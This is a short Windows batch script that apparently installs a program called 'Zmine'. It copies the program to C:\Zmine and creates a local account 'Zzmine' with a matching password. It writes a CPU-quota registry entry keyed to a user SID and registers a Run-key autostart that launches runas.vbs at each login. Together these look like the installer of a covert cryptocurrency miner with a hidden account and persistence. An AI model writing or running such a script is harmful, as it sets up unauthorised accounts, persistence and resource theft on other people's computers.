@echo off
@setlocal

xcopy "%~dp0Zmine" "C:\Zmine" /E /Y

net user Zzmine Zzmine /add
wmic useraccount get sid > out.txt
(set command=type out.txt)

for /f "usebackq tokens=*" %%i in (`%command%`) do call :process_line %%i
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Quota System\%new_line%"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Quota System\%new_line%" /v CpuRateLimit /t REG_DWORD /d 30
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Zmine /t REG_SZ /d "wscript C:\Zmine\runas.vbs"
goto :eof

:process_line
(set old_line=%new_line%)
(set new_line=%*)
goto :eof